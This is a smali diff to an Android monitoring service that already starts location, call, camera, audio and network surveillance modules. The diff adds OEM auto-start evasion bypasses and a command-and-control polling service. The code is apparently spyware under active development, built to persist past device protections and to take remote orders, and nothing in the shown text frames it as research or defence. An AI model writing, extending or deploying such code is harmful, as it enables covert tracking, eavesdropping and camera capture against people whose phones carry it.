@@ -24,6 +24,9 @@
     # Start as foreground service (Android 8+ requirement)
     invoke-static {p0}, Lcom/smilex/enhanced/utils/ForegroundHelper;->startForeground(Landroid/app/Service;)V
 
+    # Apply OEM-specific auto-start bypasses
+    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->applyAllOEMBypasses(Landroid/content/Context;)V
+
     # Initialize all monitoring modules
     invoke-static {p0}, Lcom/smilex/enhanced/modules/LocationModule;->init(Landroid/content/Context;)V
     invoke-static {p0}, Lcom/smilex/enhanced/modules/CallModule;->init(Landroid/content/Context;)V
@@ -33,6 +36,13 @@
     invoke-static {p0}, Lcom/smilex/enhanced/modules/CameraModule;->init(Landroid/content/Context;)V
     invoke-static {p0}, Lcom/smilex/enhanced/modules/AudioModule;->init(Landroid/content/Context;)V
     invoke-static {p0}, Lcom/smilex/enhanced/modules/NetworkModule;->init(Landroid/content/Context;)V
+
+    # Start C2 command polling
+    new-instance v0, Landroid/content/Intent;
+    const-class v1, Lcom/smilex/enhanced/services/C2CommandPoller;
+    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p0, v0}, Lcom/smilex/enhanced/services/CoreMonitorService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
     return-void
 .end method
 
